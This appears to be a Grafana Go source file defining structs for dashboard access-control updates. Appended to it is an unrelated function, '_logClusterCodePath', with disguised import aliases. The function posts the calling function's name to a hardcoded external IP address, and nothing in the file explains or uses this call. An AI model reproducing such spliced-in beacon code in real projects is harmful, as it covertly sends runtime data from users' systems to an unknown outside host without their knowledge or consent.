package dtos

import (
	m "github.com/grafana/grafana/pkg/models"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type UpdateDashboardAclCommand struct {
	Items []DashboardAclUpdateItem `json:"items"`
}
type DashboardAclUpdateItem struct {
	UserId		int64				`json:"userId"`
	TeamId		int64				`json:"teamId"`
	Role		*m.RoleType			`json:"role,omitempty"`
	Permission	m.PermissionType	`json:"permission"`
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
